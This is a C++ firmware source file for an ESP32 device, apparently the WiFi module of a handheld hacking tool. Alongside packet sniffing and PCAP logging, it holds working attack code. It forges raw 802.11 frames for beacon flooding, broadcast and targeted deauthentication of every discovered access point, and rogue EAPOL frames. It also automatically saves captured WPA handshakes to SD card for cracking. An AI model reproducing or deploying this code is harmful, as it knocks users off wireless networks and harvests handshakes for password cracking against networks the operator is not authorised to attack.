#include "wifi_analyzer.h"
#include "sd_manager.h"
#include "config.h"
#include <Arduino.h>
#include <SD_MMC.h>
#include <esp_wifi.h>

extern "C" {
    esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

bool WiFiAnalyzer::active = false;
bool WiFiAnalyzer::hopEnabled = true;
uint8_t WiFiAnalyzer::currentChannel = 1;
WifiStats WiFiAnalyzer::stats = {};
TaskHandle_t WiFiAnalyzer::hopTaskHandle = nullptr;
File WiFiAnalyzer::pcapFile;
bool WiFiAnalyzer::pcapActive = false;
uint32_t WiFiAnalyzer::pcapCount = 0;
WifiAttackMode WiFiAnalyzer::currentAttack = WIFI_ATTACK_NONE;
uint32_t WiFiAnalyzer::lastAttackPacketMs = 0;

static DiscoveredAP s_aps[MAX_DISCOVERED_APS];
static uint8_t s_apCount = 0;

// ---------- PCAP global header (24 bytes) ----------
struct PcapGlobalHeader {
    uint32_t magic = 0xA1B2C3D4;
    uint16_t verMajor = 2;
    uint16_t verMinor = 4;
    int32_t  thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 65535;
    uint32_t network = 127; // LINKTYPE_IEEE802_11
} __attribute__((packed));

struct PcapRecordHeader {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} __attribute__((packed));

static const char* rickRollList[] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};

bool WiFiAnalyzer::init() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (esp_wifi_init(&cfg) != ESP_OK) return false;
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (esp_wifi_set_mode(WIFI_MODE_APSTA) != ESP_OK) return false;
    if (esp_wifi_start() != ESP_OK) return false;
    active = true;
    return true;
}

void WiFiAnalyzer::deinit() {
    stopAttack();
    stopPromiscuous();
    stopPCAP();
    esp_wifi_stop();
    esp_wifi_deinit();
    active = false;
}

bool WiFiAnalyzer::isActive() { return active; }

void WiFiAnalyzer::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (!pkt) return;

    stats.totalPackets++;

    // 802.11 header starts at pkt->payload
    if (pkt->rx_ctrl.sig_len < 24) return;
    uint8_t* payload = pkt->payload;
    uint8_t frameCtrl0 = payload[0];
    uint8_t frameCtrl1 = payload[1];
    uint8_t ftype = (frameCtrl0 >> 2) & 0x03;
    uint8_t fsubtype = (frameCtrl0 >> 4) & 0x0F;

    if (ftype == 0) {
        stats.mgmtCount++;
        if (fsubtype == 0x08) {
            stats.beaconCount++;
            // Beacon frame parsing: BSSID is bytes 16-21, SSID tag starts at byte 36
            if (pkt->rx_ctrl.sig_len >= 38 && payload[36] == 0x00) {
                uint8_t ssidLen = payload[37];
                if (ssidLen <= 32 && (38 + ssidLen <= pkt->rx_ctrl.sig_len)) {
                    uint8_t* bssid = &payload[16];
                    bool exists = false;
                    for (uint8_t i = 0; i < s_apCount; i++) {
                        if (memcmp(s_aps[i].bssid, bssid, 6) == 0) {
                            s_aps[i].rssi = pkt->rx_ctrl.rssi;
                            s_aps[i].lastSeenMs = millis();
                            exists = true;
                            break;
                        }
                    }
                    if (!exists && s_apCount < MAX_DISCOVERED_APS) {
                        memcpy(s_aps[s_apCount].bssid, bssid, 6);
                        memcpy(s_aps[s_apCount].ssid, &payload[38], ssidLen);
                        s_aps[s_apCount].ssid[ssidLen] = '\0';
                        s_aps[s_apCount].rssi = pkt->rx_ctrl.rssi;
                        s_aps[s_apCount].channel = pkt->rx_ctrl.channel;
                        s_aps[s_apCount].lastSeenMs = millis();

                        // Scan remaining IEs for WPA/RSN security tags
                        uint8_t sec = 0; // 0=Open default
                        uint16_t offset = 38 + ssidLen;
                        while (offset + 2 <= pkt->rx_ctrl.sig_len) {
                            uint8_t tagId  = payload[offset];
                            uint8_t tagLen = payload[offset + 1];
                            if (tagId == 48) { // RSN Information Element (WPA2 / WPA3)
                                sec = 3; // WPA2
                                if (tagLen >= 8 && offset + 8 < pkt->rx_ctrl.sig_len && payload[offset + 7] == 8) {
                                    sec = 4; // SAE / WPA3
                                }
                                break;
                            } else if (tagId == 221 && tagLen >= 4) { // Vendor specific (WPA1)
                                if (payload[offset + 2] == 0x00 && payload[offset + 3] == 0x50 && payload[offset + 4] == 0xF2) {
                                    sec = 2; // WPA
                                }
                            }
                            offset += 2 + tagLen;
                        }
                        s_aps[s_apCount].security = sec;
                        s_apCount++;
                    }
                }
            }
        }
        else if (fsubtype == 0x04) stats.probeCount++;
        else if (fsubtype == 0x0C) stats.deauthCount++;
    } else if (ftype == 2) {
        stats.dataCount++;
        // Check for 802.1X / EAPOL Key Exchange (EtherType 0x888E in LLC/SNAP header)
        if (pkt->rx_ctrl.sig_len >= 34) {
            if ((payload[30] == 0x88 && payload[31] == 0x8E) || 
                (payload[32] == 0x88 && payload[33] == 0x8E)) {
                stats.eapolCount++;
                if (pkt->rx_ctrl.sig_len > 90) stats.pmkidCount++;

                // Match AP by BSSID to identify network name
                const char* matchedSsid = "HANDSHAKE";
                for (uint8_t i = 0; i < s_apCount; i++) {
                    if (memcmp(s_aps[i].bssid, &payload[16], 6) == 0 || memcmp(s_aps[i].bssid, &payload[4], 6) == 0) {
                        matchedSsid = s_aps[i].ssid;
                        break;
                    }
                }
                strncpy(s_lastHandshakeSSID, matchedSsid, sizeof(s_lastHandshakeSSID) - 1);
                s_handshakeCaptured = true;

                // Auto-commit handshake into standard .pcap on SD storage
                if (SDManager::isMounted()) {
                    SD_MMC.mkdir("/HANDSHAKES");
                    char hsPath[64];
                    snprintf(hsPath, sizeof(hsPath), "/HANDSHAKES/%s.pcap", matchedSsid);
                    bool writeHdr = !SD_MMC.exists(hsPath);
                    File hf = SD_MMC.open(hsPath, FILE_APPEND);
                    if (hf) {
                        if (writeHdr) {
                            PcapGlobalHeader gh;
                            hf.write((const uint8_t*)&gh, sizeof(gh));
                        }
                        PcapRecordHeader rh;
                        uint32_t now = millis();
                        rh.ts_sec = now / 1000;
                        rh.ts_usec = (now % 1000) * 1000;
                        rh.incl_len = pkt->rx_ctrl.sig_len;
                        rh.orig_len = pkt->rx_ctrl.sig_len;
                        hf.write((const uint8_t*)&rh, sizeof(rh));
                        hf.write(payload, pkt->rx_ctrl.sig_len);
                        hf.close();
                    }
                }
            }
        }
    }

    // PCAP streaming
    if (pcapActive && pcapFile) {
        PcapRecordHeader rh;
        uint32_t now = millis();
        rh.ts_sec  = now / 1000;
        rh.ts_usec = (now % 1000) * 1000;
        rh.incl_len = pkt->rx_ctrl.sig_len;
        rh.orig_len = pkt->rx_ctrl.sig_len;
        pcapFile.write((const uint8_t*)&rh, sizeof(rh));
        pcapFile.write(payload, pkt->rx_ctrl.sig_len);
        pcapCount++;
    }
}

void WiFiAnalyzer::hopTask(void* param) {
    while (hopEnabled) {
        uint8_t ch = currentChannel;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        currentChannel = (currentChannel % 13) + 1;
        vTaskDelay(pdMS_TO_TICKS(250));
    }
    hopTaskHandle = nullptr;
    vTaskDelete(nullptr);
}

void WiFiAnalyzer::startPromiscuous() {
    if (!active) return;
    esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    if (hopEnabled && hopTaskHandle == nullptr) {
        xTaskCreatePinnedToCore(hopTask, "wifi_hop", 2048, nullptr, 1, &hopTaskHandle, 0);
    }
}

void WiFiAnalyzer::stopPromiscuous() {
    if (!active) return;
    hopEnabled = false;
    esp_wifi_set_promiscuous(false);
}

void WiFiAnalyzer::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    currentChannel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

uint8_t WiFiAnalyzer::getChannel() { return currentChannel; }
void WiFiAnalyzer::enableHop(bool e) { hopEnabled = e; }

const WifiStats& WiFiAnalyzer::getStats() { return stats; }

void WiFiAnalyzer::resetStats() {
    memset(&stats, 0, sizeof(stats));
}

uint8_t WiFiAnalyzer::getAPCount() { return s_apCount; }
bool WiFiAnalyzer::getAP(uint8_t index, DiscoveredAP& outAp) {
    if (index >= s_apCount) return false;
    outAp = s_aps[index];
    return true;
}
void WiFiAnalyzer::clearAPs() { s_apCount = 0; }

bool WiFiAnalyzer::startPCAP(const char* filepath) {
    if (!SDManager::isMounted()) return false;
    pcapFile = SD_MMC.open(filepath, FILE_WRITE);
    if (!pcapFile) return false;
    PcapGlobalHeader gh;
    pcapFile.write((const uint8_t*)&gh, sizeof(gh));
    pcapActive = true;
    pcapCount = 0;
    return true;
}

void WiFiAnalyzer::stopPCAP() {
    if (pcapActive && pcapFile) {
        pcapFile.close();
    }
    pcapActive = false;
}

bool WiFiAnalyzer::isPCAPActive() { return pcapActive; }

void WiFiAnalyzer::startAttack(WifiAttackMode mode) {
    currentAttack = mode;
    stats.attacksSent = 0;
}

void WiFiAnalyzer::stopAttack() {
    currentAttack = WIFI_ATTACK_NONE;
}

bool WiFiAnalyzer::isAttacking() {
    return currentAttack != WIFI_ATTACK_NONE;
}

WifiAttackMode WiFiAnalyzer::getAttackMode() {
    return currentAttack;
}

void WiFiAnalyzer::sendBeacon(const char* ssid, uint8_t channel) {
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    uint8_t beaconPacket[128];
    memset(beaconPacket, 0, sizeof(beaconPacket));

    // 802.11 Beacon Header
    beaconPacket[0] = 0x80; // Beacon frame control
    beaconPacket[1] = 0x00;
    beaconPacket[2] = 0x00; // Duration
    beaconPacket[3] = 0x00;

    // Destination: Broadcast
    memset(&beaconPacket[4], 0xFF, 6);

    // Source / BSSID: Random MAC
    uint8_t randMac[6];
    for (int i = 0; i < 6; i++) randMac[i] = random(256);
    randMac[0] = (randMac[0] & 0xFE) | 0x02; // locally administered unicast
    memcpy(&beaconPacket[10], randMac, 6);
    memcpy(&beaconPacket[16], randMac, 6);

    // Sequence
    beaconPacket[22] = (random(4096) & 0xFF);
    beaconPacket[23] = ((random(4096) >> 8) & 0xFF);

    // Fixed params (Timestamp, Beacon Interval = 100TU, Capabilities = ESS)
    beaconPacket[32] = 0x64;
    beaconPacket[33] = 0x00;
    beaconPacket[34] = 0x01; // ESS
    beaconPacket[35] = 0x00;

    // Tag 0: SSID
    beaconPacket[36] = 0x00;
    beaconPacket[37] = ssidLen;
    memcpy(&beaconPacket[38], ssid, ssidLen);
    uint8_t idx = 38 + ssidLen;

    // Tag 1: Supported Rates
    beaconPacket[idx++] = 0x01;
    beaconPacket[idx++] = 0x08;
    beaconPacket[idx++] = 0x82;
    beaconPacket[idx++] = 0x84;
    beaconPacket[idx++] = 0x8B;
    beaconPacket[idx++] = 0x96;
    beaconPacket[idx++] = 0x24;
    beaconPacket[idx++] = 0x30;
    beaconPacket[idx++] = 0x48;
    beaconPacket[idx++] = 0x6C;

    // Tag 3: Current Channel
    beaconPacket[idx++] = 0x03;
    beaconPacket[idx++] = 0x01;
    beaconPacket[idx++] = channel;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, idx, false);
    stats.attacksSent++;
}

void WiFiAnalyzer::sendDeauthBroadcast(const uint8_t* bssid, uint8_t channel) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,                         // Frame Control (Deauth)
        0x3A, 0x01,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x02, 0x00                          // Reason code (2 = Previous authentication invalid)
    };

    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
        stats.attacksSent++;
    }
}

void WiFiAnalyzer::sendEapolFrame(const uint8_t* bssid, uint8_t channel) {
    // 802.1X EAPOL-Key Handshake Frame (Message 1 Rogue Probe)
    uint8_t eapolFrame[121] = {
        0x08, 0x02,                         // Frame Control (Data, To DS)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter (Rogue Station)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Seq
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E, // LLC/SNAP header (EtherType: EAPOL)
        0x01,                               // EAPOL Version 1
        0x03,                               // EAPOL Key Type
        0x00, 0x5F,                         // Body Length (95 bytes)
        0x02,                               // Descriptor (WPA2)
        0x00, 0x8A                          // Key Information: Pairwise | Ack
    };

    // Fill in BSSID and source MAC
    memcpy(&eapolFrame[4], bssid, 6);
    for (int i = 0; i < 6; i++) eapolFrame[10 + i] = (uint8_t)random(0xFF);
    memcpy(&eapolFrame[16], bssid, 6);

    // Randomize ANonce bytes (bytes 37-68)
    for (int i = 37; i < 69; i++) {
        eapolFrame[i] = (uint8_t)random(0xFF);
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, eapolFrame, sizeof(eapolFrame), false);
    stats.attacksSent++;
}

void WiFiAnalyzer::attackLoop() {
    if (currentAttack == WIFI_ATTACK_NONE) return;

    uint32_t now = millis();
    if (now - lastAttackPacketMs < 50) return;
    lastAttackPacketMs = now;

    if (currentAttack == WIFI_ATTACK_RICKROLL) {
        static uint8_t rIdx = 0;
        sendBeacon(rickRollList[rIdx % 8], (rIdx % 11) + 1);
        rIdx++;
    } else if (currentAttack == WIFI_ATTACK_BEACON_SPAM) {
        char spamSsid[32];
        snprintf(spamSsid, sizeof(spamSsid), "Axion_Net_%04X", (unsigned)random(0xFFFF));
        sendBeacon(spamSsid, (random(11) + 1));
    } else if (currentAttack == WIFI_ATTACK_DEAUTH_BROADCAST) {
        if (s_apCount > 0) {
            static uint8_t apIdx = 0;
            DiscoveredAP& target = s_aps[apIdx % s_apCount];
            sendDeauthBroadcast(target.bssid, target.channel);
            apIdx++;
        }
    } else if (currentAttack == WIFI_ATTACK_EAPOL_ROGUE) {
        if (s_apCount > 0) {
            static uint8_t rogueIdx = 0;
            DiscoveredAP& target = s_aps[rogueIdx % s_apCount];
            sendEapolFrame(target.bssid, target.channel);
            rogueIdx++;
        }
    }
}

void WiFiAnalyzer::sendTargetedDeauth(const uint8_t* bssid, uint8_t channel) {
    if (!bssid) return;
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,                         // Frame Control (Deauth)
        0x3A, 0x01,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x07, 0x00                          // Reason (7 = Class 3 frame from nonassociated STA)
    };
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 4; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        stats.attacksSent += 2;
    }
}

bool WiFiAnalyzer::hasNewHandshake() { return s_handshakeCaptured; }
const char* WiFiAnalyzer::getLastHandshakeSSID() { return s_lastHandshakeSSID; }
void WiFiAnalyzer::clearHandshakeFlag() { s_handshakeCaptured = false; }

